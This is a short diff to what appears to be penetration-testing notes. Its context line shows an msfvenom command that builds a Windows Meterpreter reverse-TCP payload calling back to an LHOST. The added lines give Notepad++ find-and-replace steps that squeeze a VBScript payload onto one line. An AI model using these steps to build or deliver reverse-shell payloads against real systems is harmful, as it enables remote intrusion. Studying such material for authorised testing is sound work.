@@ -30,4 +30,7 @@ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.
 ```
 Match and replace roles in Notepad++ (to make the payload oneliner):
 
-- 
+- ` _.*?\n` with `✅ matches newline` option enabled (remove continuation lines)
+- `    ` (remove tabs)
+- match `\n` replace with `:` (remove newline and replace it with `:` which is the VB script command terminator) **If you copied from the terminal, match on `\n\r` instead of jsut `\n`**
+- mach `::` replace with `:` **repeat this multiple times** (remove consecutive conlons and replace it by only one colon)
